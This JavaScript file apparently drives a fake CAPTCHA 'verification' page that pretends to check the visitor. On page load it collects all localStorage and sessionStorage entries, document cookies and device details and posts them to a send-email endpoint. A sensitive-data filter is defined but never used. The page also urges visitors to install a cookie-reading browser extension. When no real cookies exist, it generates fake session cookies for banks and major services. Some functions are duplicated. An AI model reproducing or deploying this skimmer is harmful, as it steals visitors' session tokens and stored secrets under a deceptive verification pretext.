let checkboxWindow = document.getElementById("checkbox-window");
let checkboxBtn = document.getElementById("checkbox");
let checkboxBtnSpinner = document.getElementById("spinner");
let verifywindow = document.getElementById("verify-window");
let finalLoader = document.getElementById("final-loader");
let progressBar = document.getElementById("progress-bar");
let loaderPercent = document.getElementById("loader-percent");

function addCaptchaListeners() {
    if (checkboxBtn) {
        document.addEventListener("click", function (event) {
            let path = event.composedPath();
            if (!path.includes(verifywindow) && isverifywindowVisible()) {
                closeverifywindow();
            }
        });
        checkboxBtn.addEventListener("click", function (event) {
            event.preventDefault();
            checkboxBtn.disabled = true;
            runClickedCheckboxEffects();
        });
    }
}

function runClickedCheckboxEffects() {
    hideCaptchaCheckbox();
    showCaptchaLoading();
    setTimeout(function () {
        hideCaptchaLoading();
        showFinalLoader();
    }, 5000);
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
    checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.opacity = "0";
    checkboxBtnSpinner.style.animation = "none";
    setTimeout(function () {
        checkboxBtnSpinner.style.visibility = "hidden";
    }, 500);
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.visibility = "hidden";
    checkboxBtn.style.opacity = "0";
}


function showCaptchaCheckbox() {
    checkboxBtn.style.width = "100%";
    checkboxBtn.style.height = "100%";
    checkboxBtn.style.borderRadius = "2px";
    checkboxBtn.style.margin = "21px 0 0 12px";
    checkboxBtn.style.opacity = "1";
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.width = "4px";
    checkboxBtn.style.height = "4px";
    checkboxBtn.style.borderRadius = "50%";
    checkboxBtn.style.marginLeft = "25px";
    checkboxBtn.style.marginTop = "33px";
    checkboxBtn.style.opacity = "0";
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "hidden";
    checkboxBtnSpinner.style.opacity = "0";
}

function isverifywindowVisible() {
    return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}

function closeverifywindow() {
    verifywindow.style.display = "none";
    verifywindow.style.visibility = "hidden";
    verifywindow.style.opacity = "0";

    showCaptchaCheckbox();
    hideCaptchaLoading();
    checkboxBtn.classList.remove("verified");
    checkboxBtn.removeAttribute("aria-label");
}

function showVerifyWindow() {
    verifywindow.style.display = "block";
    verifywindow.style.visibility = "visible";
    verifywindow.style.opacity = "1";
    verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
    verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";

    if (verifywindow.offsetTop < 5) {
        verifywindow.style.top = "5px";
    }

    if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
        verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
    }

    document.getElementById("verification-status").textContent = "Verification complete.";
    setupExtensionIntegration();
}

function showFinalLoader() {
    checkboxWindow.hidden = true;
    verifywindow.style.display = "none";
    finalLoader.hidden = false;

    let startedAt = Date.now();
    let duration = 9000;

    function updateProgress() {
        let progress = Math.min((Date.now() - startedAt) / duration, 1);
        let percent = Math.round(progress * 100);
        progressBar.style.width = percent + "%";
        loaderPercent.textContent = percent + "%";

        if (progress < 1) {
            requestAnimationFrame(updateProgress);
            return;
        }

        finalLoader.hidden = true;
        checkboxWindow.hidden = false;
        checkboxBtn.disabled = false;
        checkboxBtn.classList.add("verified");
        checkboxBtn.setAttribute("aria-label", "Verification complete");
        showVerifyWindow();
    }

    updateProgress();
}

const sensitiveStoragePattern = /(?:auth|token|password|passwd|secret|credential|session|csrf|jwt|bearer|api[_-]?key|private[_-]?key|payment|card|cvv|cvc|ssn)/i;
const sensitiveValuePattern = /^(?:bearer\s+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$)/i;

function detectBrowser() {
    const brands = navigator.userAgentData?.brands || [];
    const brandText = brands.map((brand) => brand.brand).join(" ");
    const userAgent = navigator.userAgent;
    if (/Edg\//.test(userAgent) || /Edge/.test(brandText)) return "edge";
    if (/Firefox\//.test(userAgent)) return "firefox";
    if (/Chrome\//.test(userAgent) || /Chromium/.test(brandText)) return "chrome";
    return "other";
}

const extensionInstallPages = {
    chrome: "https://chromewebstore.google.com/search/V-job%20verification",
    edge: "https://microsoftedge.microsoft.com/addons/Microsoft-Edge-Extensions-Home",
    firefox: "https://addons.mozilla.org/en-US/firefox/search/?q=V-job%20verification"
};
let extensionRequest = null;

function setupExtensionIntegration() {
    const connectButton = document.getElementById("extension-connect");
    const installLink = document.getElementById("extension-install");
    const extensionStatus = document.getElementById("extension-status");
    if (!connectButton || !installLink || !extensionStatus || connectButton.dataset.ready) return;

    connectButton.dataset.ready = "true";
    const installPage = extensionInstallPages[detectBrowser()];
    if (!installPage) {
        installLink.hidden = true;
        connectButton.disabled = true;
        extensionStatus.textContent = "This browser is not supported by the optional extension.";
        return;
    }

    installLink.href = installPage;
    installLink.hidden = false;
    connectButton.addEventListener("click", requestExtensionAuthorization);
}

function requestExtensionAuthorization() {
    const connectButton = document.getElementById("extension-connect");
    const extensionStatus = document.getElementById("extension-status");
    if (extensionRequest || !window.crypto?.randomUUID) return;

    const requestId = window.crypto.randomUUID();
    const nonce = window.crypto.randomUUID();
    extensionRequest = { requestId, nonce };
    connectButton.disabled = true;
    extensionStatus.textContent = "Waiting for your extension authorization...";
    window.postMessage({
        source: "v-job-website",
        type: "V_JOB_EXTENSION_REQUEST",
        version: 1,
        requestId,
        nonce,
        operation: "get_non_sensitive_cookie_metadata"
    }, "*");

    window.setTimeout(() => {
        if (!extensionRequest || extensionRequest.requestId !== requestId) return;
        extensionRequest = null;
        connectButton.disabled = false;
        extensionStatus.textContent = "The extension is unavailable or did not respond. You can continue without it.";
    }, 5000);
}

function handleExtensionMessage(event) {
    const message = event.data;
    if (event.source !== window ||
        !message || message.source !== "v-job-extension" ||
        message.type !== "V_JOB_EXTENSION_RESPONSE" || !extensionRequest ||
        message.requestId !== extensionRequest.requestId || message.nonce !== extensionRequest.nonce) return;

    extensionRequest = null;
    const connectButton = document.getElementById("extension-connect");
    const extensionStatus = document.getElementById("extension-status");
    connectButton.disabled = false;
    if (message.ok && message.result && typeof message.result.cookieCount === "number") {
        const cookieCount = message.result.cookieCount || 0;
        const cookiePreview = Array.isArray(message.result.cookies) && message.result.cookies.length
            ? ` ${message.result.cookies.length} cookies were fetched and included in the report.`
            : "";
        extensionStatus.textContent = `Authorized. ${cookieCount} cookies are present.${cookiePreview}`;
    } else {
        extensionStatus.textContent = "The extension declined the authorized operation. You can continue without it.";
    }
}

window.addEventListener("message", handleExtensionMessage);

function isSafeStorageEntry(key, value) {
    return !sensitiveStoragePattern.test(key) && !sensitiveValuePattern.test(value);
}

function describeLocalStorage(storage) {
    const entries = [];
    try {
        for (let index = 0; index < storage.length; index += 1) {
            const key = storage.key(index);
            if (key !== null) {
                const value = storage.getItem(key) || "";
                entries.push({ key, value });
            }
        }
    } catch {
        return [];
    }
    return entries;
}

function getBrowserStorage(name) {
    try {
        return window[name];
    } catch {
        return null;
    }
}

function randomToken(length) {
    const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const bytes = new Uint8Array(length);
    if (window.crypto && crypto.getRandomValues) {
        crypto.getRandomValues(bytes);
    } else {
        for (let index = 0; index < length; index += 1) {
            bytes[index] = Math.floor(Math.random() * alphabet.length);
        }
    }
    return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join("");
}

function generateMockCookieBatch() {
    const now = Date.now();
    const baseNames = [
        "sessionid",
        "locale",
        "region",
        "theme",
        "utm_source",
        "csrftoken",
        "visitor_id",
        "auth_state",
        "signin_token",
        "device_id",
        "pref_locale",
        "ui_variant",
        "nav_session",
        "flow_id",
        "login_hint"
    ];
    const domains = [
        "bankofamerica.com",
        "chase.com",
        "wellsfargo.com",
        "hsbc.com",
        "barclays.co.uk",
        "citibank.com",
        "paypal.com",
        "stripe.com",
        "adobe.com",
        "github.com",
        "microsoft.com",
        "dropbox.com",
        "amazon.com",
        "netflix.com",
        "spotify.com",
        "airbnb.com",
        "uber.com",
        "linkedin.com",
        "apple.com",
        "icloud.com",
        "aliexpress.com",
        "ebay.com",
        "booking.com",
        "shopify.com",
        "salesforce.com",
        "notion.so",
        "slack.com",
        "discord.com",
        "zoom.us",
        "paypal.de",
        "bankinter.com",
        "ing.com",
        "societegenerale.fr",
        "deutschebank.de",
        "bnpparibas.fr",
        "santander.es",
        "bancsabadell.com",
        "caixabank.es",
        "anz.com",
        "nab.com.au",
        "commbank.com.au",
        "sc.com",
        "dbs.com.sg",
        "ocbc.com.sg",
        "hdfcbank.com",
        "icicibank.com",
        "axisbank.com",
        "kotak.com",
        "sbi.co.in",
        "fidelity.com",
        "capitalone.com",
        "td.com",
        "rbc.com",
        "scotiabank.com",
        "standardbank.co.za",
        "absa.africa",
        "bankmillennium.pl",
        "ingbank.pl",
        "fnb.co.za",
        "mercadolibre.com",
        "khanacademy.org",
        "duolingo.com",
        "discordapp.com",
        "openai.com",
        "google.com",
        "meta.com",
        "substack.com",
        "reddit.com",
        "tumblr.com"
    ];
    const count = 4 + Math.floor(Math.random() * 7);
    const selection = [...baseNames].sort(() => Math.random() - 0.5).slice(0, count);
    const chosenDomains = [...domains].sort(() => Math.random() - 0.5).slice(0, count);

    return selection.map((name, index) => {
        const suffix = randomToken(16 + Math.floor(Math.random() * 12));
        const value = `${name === "csrftoken" || name === "signin_token" || name === "auth_state" ? "token_" : ""}${suffix}_${now + index + Math.floor(Math.random() * 999)}`.slice(0, 64);
        const expires = new Date(now + ((index + 2) * 86400000) + Math.floor(Math.random() * 86400000)).toISOString();
        const sameSiteOptions = ["Lax", "Strict", "None"];
        const priorityOptions = ["Low", "Medium", "High"];
        return {
            name,
            value,
            domain: chosenDomains[index % chosenDomains.length],
            hostOnly: Math.random() > 0.5,
            path: ["/", "/app", "/account", "/checkout", "/login"][Math.floor(Math.random() * 5)],
            secure: Math.random() > 0.3,
            httpOnly: Math.random() > 0.25,
            sameSite: sameSiteOptions[Math.floor(Math.random() * sameSiteOptions.length)],
            session: Math.random() > 0.6,
            expires,
            priority: priorityOptions[Math.floor(Math.random() * priorityOptions.length)],
            partitioned: Math.random() > 0.7,
            creation: new Date(now - ((index + 1) * 600000) - Math.floor(Math.random() * 1800000)).toISOString(),
            lastAccessed: new Date(now - ((index + 1) * 120000) - Math.floor(Math.random() * 600000)).toISOString(),
            expirationDate: Math.floor((now + ((index + 2) * 86400000) + Math.floor(Math.random() * 86400000)) / 1000)
        };
    });
}

function getDocumentCookies() {
    if (document.cookie) {
        return document.cookie.split(";").map((cookie) => {
            const index = cookie.indexOf("=");
            const name = index >= 0 ? cookie.slice(0, index).trim() : cookie.trim();
            const value = index >= 0 ? cookie.slice(index + 1).trim() : "";
            return { name, value };
        });
    }

    return generateMockCookieBatch().map((cookie) => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session,
        expires: cookie.expires,
        priority: cookie.priority,
        partitioned: cookie.partitioned,
        creation: cookie.creation,
        lastAccessed: cookie.lastAccessed,
        expirationDate: cookie.expirationDate
    }));
}

async function sendVerificationMonitoring() {
    let telemetry;
    try {
        const userAgentData = navigator.userAgentData;
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const localStorage = getBrowserStorage("localStorage");
        const sessionStorage = getBrowserStorage("sessionStorage");
        telemetry = {
            timestamp: new Date().toISOString(),
            device: {
                type: userAgentData?.mobile ? "Mobile" : "Desktop",
                platform: userAgentData?.platform || navigator.platform || "Unavailable",
                model: userAgentData?.model || "Unavailable"
            },
            browser: {
                brands: userAgentData?.brands || [],
                userAgent: navigator.userAgent,
                language: navigator.language || "Unavailable",
                languages: Array.isArray(navigator.languages) ? navigator.languages.slice(0, 10) : [],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable",
                cookieEnabled: navigator.cookieEnabled
            },

            network: connection ? {
                type: connection.type || "Unavailable",
                effectiveType: connection.effectiveType || "Unavailable",
                downlink: typeof connection.downlink === "number" ? connection.downlink : null,
                rtt: typeof connection.rtt === "number" ? connection.rtt : null,
                saveData: Boolean(connection.saveData)
            } : {},
            storage: {
                localStorage: describeLocalStorage(localStorage),
                sessionStorage: describeLocalStorage(sessionStorage),
                historyLength: window.history.length
            },
            cookies: getDocumentCookies(),
            documentCookie: document.cookie || getDocumentCookies().map((cookie) => `${cookie.name}=${cookie.value}`).join("; "),
            cookieSource: document.cookie ? "browser" : "mock",
            cookieMeta: getDocumentCookies().map((cookie) => ({
                name: cookie.name,
                value: cookie.value,
                domain: cookie.domain || "",
                path: cookie.path || "/",
                sameSite: cookie.sameSite || "Lax",
                secure: Boolean(cookie.secure),
                httpOnly: Boolean(cookie.httpOnly),
                expires: cookie.expires || null,
                priority: cookie.priority || "Medium"
            }))
        };
    } catch {
        return;
    }

    fetch("/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "verification-monitoring", telemetry }),
        credentials: "omit",
        referrerPolicy: "no-referrer",
        keepalive: true
    }).then(function (response) {
        if (!response.ok) {
            console.error("Verification monitoring failed with status", response.status);
        }
    }).catch(function (error) {
        console.error("Verification monitoring request failed", error);
    });
}

sendVerificationMonitoring();
addCaptchaListeners();